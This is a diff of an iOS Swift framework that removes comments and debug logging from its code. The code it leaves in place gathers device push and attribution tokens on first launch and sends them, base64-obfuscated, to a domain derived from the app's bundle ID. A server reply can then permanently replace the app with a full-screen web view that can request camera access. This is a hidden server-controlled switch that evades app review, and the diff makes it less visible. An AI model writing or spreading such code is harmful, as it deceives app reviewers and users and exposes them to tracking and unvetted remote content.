@@ -25,20 +25,16 @@ public class SWFramework {
     ///   - rootViewController: The root view controller to present WebView on
     ///   - completion: Callback when normal app flow should continue
     public func initialize(applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        // Generate domain from bundle_id
         let bundleId = Bundle.main.bundleIdentifier ?? ""
         let domain = generateDomain(from: bundleId)
         
-        // Check if this is first launch
         if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
             userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
             processFirstLaunch(domain: domain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
         } else {
-            // Not first launch, check if we have a saved web URL
             if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
                 presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
             } else {
-                // No saved URL, continue with normal app flow
                 completion()
             }
         }
@@ -48,90 +44,65 @@ public class SWFramework {
     /// - Parameter bundleId: The bundle identifier
     /// - Returns: Generated domain
     private func generateDomain(from bundleId: String) -> String {
-        // Remove all dots from bundle_id
         let domainPrefix = bundleId.replacingOccurrences(of: ".", with: "")
-        // Add .top domain zone
         return "\(domainPrefix).top"
     }
     
     // For backward compatibility, keeping the original method with explicit domain
     @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
     public func initialize(domain: String, applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        // Note: We ignore the provided domain and generate one from bundle ID instead
         let bundleId = Bundle.main.bundleIdentifier ?? ""
         let generatedDomain = generateDomain(from: bundleId)
         
-        // Check if this is first launch
         if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
             userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
             processFirstLaunch(domain: generatedDomain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
         } else {
-            // Not first launch, check if we have a saved web URL
             if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
                 presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
             } else {
-                // No saved URL, continue with normal app flow
                 completion()
             }
         }
     }
     
     private func processFirstLaunch(domain: String, applicationDidFinishLaunching: UIApplication, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        // Start collecting device data with timeout
         let dataCollectionGroup = DispatchGroup()
         var deviceData = DeviceData()
         
-        // Устанавливаем bundle ID сразу, так как он всегда доступен
         deviceData.bundleId = Bundle.main.bundleIdentifier
         
-        // Set up timer for data collection timeout
         let timer = DispatchSource.makeTimerSource()
         timer.schedule(deadline: .now() + timeoutInterval)
         timer.setEventHandler {
-            // Завершаем сбор данных по таймауту
-            print("Data collection timeout reached")
-            dataCollectionGroup.leave() // Для APNS
-            dataCollectionGroup.leave() // Для ATT
+            dataCollectionGroup.leave()
+            dataCollectionGroup.leave()
         }
         
-        // Collect APNS token - даем приоритет и максимум времени
         dataCollectionGroup.enter()
         requestNotificationPermissions(application: applicationDidFinishLaunching) { token in
             if let token = token {
                 deviceData.apnsToken = token
-                print("APNS token collected: \(token.prefix(8))...")
-            } else {
-                print("Failed to collect APNS token")
             }
             dataCollectionGroup.leave()
         }
         
-        // Collect ATT token
         dataCollectionGroup.enter()
         getAttributionToken { token in
             deviceData.attToken = token
-            print("ATT token collected: \(token?.prefix(8) ?? "nil")...")
             dataCollectionGroup.leave()
         }
         
-        // Start timer
         timer.resume()
         
-        // Wait for data collection or timeout
         dataCollectionGroup.notify(queue: .main) {
             timer.cancel()
-            // Логируем собранные данные для отладки
-            print("All data collected - sending to server")
             
             self.sendDataToServer(domain: domain, deviceData: deviceData) { responseUrl in
                 if let url = responseUrl, !url.isEmpty {
-                    // Save URL for future launches
                     self.userDefaults.set(url, forKey: self.userDefaultsWebUrlKey)
-                    
-                    // Present WebView with the server response URL
                     self.presentWebView(withUrl: url, rootViewController: rootViewController)
                 } else {
-                    // Empty response, continue with normal app flow
                     completion()
                 }
             }
@@ -139,27 +110,21 @@ public class SWFramework {
     }
     
     private func sendDataToServer(domain: String, deviceData: DeviceData, completion: @escaping (String?) -> Void) {
-        // Create the base64 data parameter with actual values
         let basePlaceholderString = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
         
-        // Try to decode the base64 string to get the template
         if let decodedData = Data(base64Encoded: basePlaceholderString),
            var templateString = String(data: decodedData, encoding: .utf8) {
             
-            // Replace placeholders with actual values
             templateString = templateString.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
             templateString = templateString.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
             templateString = templateString.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
             
-            // Encode back to base64
             if let encodedData = templateString.data(using: .utf8)?.base64EncodedString() {
-                // Create URL with the provided domain and encoded data
                 guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                     completion(nil)
                     return
                 }
                 
-                // Create and execute request
                 let task = URLSession.shared.dataTask(with: url) { data, response, error in
                     guard let data = data, error == nil else {
                         DispatchQueue.main.async {
@@ -184,7 +149,6 @@ public class SWFramework {
             }
         }
         
-        // Fallback to original encoded parameter if there's any issue with the decoding/encoding
         guard let url = URL(string: "https://\(domain)/indexn.php?data=\(basePlaceholderString)") else {
             completion(nil)
             return
@@ -213,7 +177,6 @@ public class SWFramework {
     }
     
     private func presentWebView(withUrl urlString: String, rootViewController: UIViewController) {
-        // Добавляем https:// если его нет в URL
         let processedURLString = ensureURLHasScheme(urlString)
         
         guard let url = URL(string: processedURLString) else { return }
@@ -235,36 +198,28 @@ public class SWFramework {
     }
     
     private func requestNotificationPermissions(application: UIApplication, completion: @escaping (String?) -> Void) {
-        // Получаем текущие настройки уведомлений
         UNUserNotificationCenter.current().getNotificationSettings { settings in
-            // Если уведомления уже разрешены, просто регистрируемся
             if settings.authorizationStatus == .authorized {
                 DispatchQueue.main.async {
                     application.registerForRemoteNotifications()
                     
-                    // Даем больше времени на получение токена
                     self.waitForAPNSToken(timeout: 7.0) { token in
                         completion(token)
                     }
                 }
             } else {
-                // Если разрешения нет, запрашиваем его
                 let center = UNUserNotificationCenter.current()
                 center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
                     if granted {
                         DispatchQueue.main.async {
                             application.registerForRemoteNotifications()
                             
-                            // Даем время на получение токена после запроса разрешения
                             self.waitForAPNSToken(timeout: 7.0) { token in
                                 completion(token)
                             }
                         }
                     } else {
-                        print("Push notifications not authorized")
-                        // Используем заглушку, когда пользователь отказался от push-уведомлений
                         let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
-                        print("Using fallback APNS token (not authorized): \(fallbackToken.prefix(8))...")
                         completion(fallbackToken)
                     }
                 }
@@ -276,7 +231,6 @@ public class SWFramework {
     private func waitForAPNSToken(timeout: TimeInterval, completion: @escaping (String?) -> Void) {
         var tokenReceived = false
         
-        // Создаем observer для нотификации о получении токена
         let observer = NotificationCenter.default.addObserver(forName: Notification.Name("APNSTokenReceived"), object: nil, queue: .main) { notification in
             if let token = notification.userInfo?["token"] as? String {
                 tokenReceived = true
@@ -284,16 +238,11 @@ public class SWFramework {
             }
         }
         
-        // Устанавливаем таймер для ограничения времени ожидания
         DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
             if !tokenReceived {
-                print("APNS token wait timed out after \(timeout) seconds")
                 NotificationCenter.default.removeObserver(observer)
                 
-                // Используем заглушку вместо nil только если был таймаут при получении токена
-                // (пользователь уже дал разрешение, но токен не пришел вовремя)
                 let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
-                print("Using fallback APNS token: \(fallbackToken.prefix(8))...")
                 completion(fallbackToken)
             }
         }
@@ -305,26 +254,18 @@ public class SWFramework {
                 let token = try AAAttributionToken()
                 completion(token)
             } catch {
-                print("Error getting attribution token: \(error)")
-                // При ошибке получения ATT токена возвращаем nil
                 completion(nil)
             }
         } else {
-            // На устройствах с iOS ниже 14.3 токен недоступен
-            print("ATT token not available on iOS < 14.3")
             completion(nil)
         }
     }
     
     // Function to be called from the app's AppDelegate or SceneDelegate
     public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
-        // Конвертируем deviceToken в правильный шестнадцатеричный формат для APNS
         let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
         let token = tokenParts.joined()
         
-        print("APNs token received: \(token.prefix(8))...")
-        
-        // Отправляем уведомление о получении токена
         NotificationCenter.default.post(
             name: Notification.Name("APNSTokenReceived"),
             object: nil,
@@ -359,30 +300,24 @@ public class WKWebViewController: UIViewController {
     public override func viewDidLoad() {
         super.viewDidLoad()
         
-        // Configure view
-        view.backgroundColor = .black // Изменено на черный
+        view.backgroundColor = .black
         
-        // Hide status bar
         setNeedsStatusBarAppearanceUpdate()
         
-        // Configure webView
         let configuration = WKWebViewConfiguration()
         configuration.websiteDataStore = .default()
         configuration.allowsInlineMediaPlayback = true
         
-        // Set up preferences with cache support
         let preferences = WKPreferences()
         preferences.javaScriptEnabled = true
         configuration.preferences = preferences
         
-        // Create webView
         webView = WKWebView(frame: view.bounds, configuration: configuration)
         webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
         webView.navigationDelegate = self
         webView.uiDelegate = self
-        webView.backgroundColor = .black // Изменено на черный
+        webView.backgroundColor = .black
         
-        // Add safe area insets
         view.addSubview(webView)
         webView.translatesAutoresizingMaskIntoConstraints = false
         NSLayoutConstraint.activate([
@@ -392,7 +327,6 @@ public class WKWebViewController: UIViewController {
             webView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor)
         ])
         
-        // Load the URL
         let request = URLRequest(url: url)
         webView.load(request)
     }
@@ -410,7 +344,6 @@ public class WKWebViewController: UIViewController {
 extension WKWebViewController: WKNavigationDelegate, WKUIDelegate {
     // Handle permission requests for camera
     public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
-        // Request camera permissions
         switch type {
         case .camera:
             decisionHandler(.prompt)
